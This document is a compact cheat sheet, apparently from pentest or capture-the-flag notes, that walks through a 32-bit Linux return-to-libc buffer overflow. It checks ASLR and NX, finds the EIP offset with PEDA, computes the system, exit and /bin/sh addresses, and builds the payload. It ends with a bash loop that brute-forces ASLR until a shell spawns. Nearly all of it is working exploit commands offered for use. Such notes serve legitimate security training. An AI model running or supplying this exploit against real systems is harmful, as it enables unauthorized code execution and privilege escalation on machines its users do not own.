## Overflow Guide

### Linux (Return to libc)
```
# Attempt to overflow for a seg fault
./program $(python -c 'print "A"*500')

# Test for ASLR (Address Space Layout Randomization) on the target machine
# A return value of 2 means that ASLR is on
cat /proc/sys/kernel/randomize_va_space

# Another check for ASLR is checking if the libc address changes in the program
# If the (0xb.....) value changes, ASLR is on
ldd /usr/local/bin/target_program | grep libc

# apt install checksec to see if NX enabled
# If it is, we can't run shellcode from the stack, which is where we can write
checksec --file=target_program

# Install PEDA (Python Exploit Development Assistance for GDB)
# https://github.com/longld/peda

# 1. Find the overflow offset using gdb
gdb -q ./target_program

# 2. Use pattern_create (part of PEDA) to create a 500 char pattern
pattern_create 500

# 3. Copy and paste the pattern
run 'Thepatternyoucopied'
 
# 4. Copy the overflow value from the EIP register and check the offset
pattern_offset <value>

# 5. Run the program again with A's, and B's at the offset
run `python -c 'print "A"*<value> + "BBBB"'`

# 6. Now find an address of libc, outside of gdb. Copy the (0xb....)
ldd /usr/local/bin/target_program | grep libc

# 7. Get offsets for system, exit outside of gdb
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -e " system@" -e " exit@"

# 8. Get offset for bin/sh
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep  "/bin/"

# Add the value of libc, to the value of system, exit and /bin/sh respectively eg.
exit: 0xb75f8000+0x33260 = 0xB762B260
system: 0xb75f8000+0x40310 = 0xB7638310
/bin/sh: = 0xb75f8000+0x162bac = 0xB775ABAC

# Run your overflow exploit as so (if ASLR were disabled)
# The order is <offset>+system+exit+/bin/sh
/usr/local/bin/target_program $(python -c 'print "\x90"*<offset-value> + "\x10\x83\x63\xb7" + "\x60\xb2\x62\xb7" + "\xac\xab\x75\xb7"');

# Because ASLR is enabled, run it in a loop until you get a shell
while true; do /usr/local/bin/target_program $(python -c 'print "\x90"*112 + "\x10\x83\x63\xb7" + "\x60\xb2\x62\xb7" + "\xac\xab\x75\xb7"'); done 
```
---

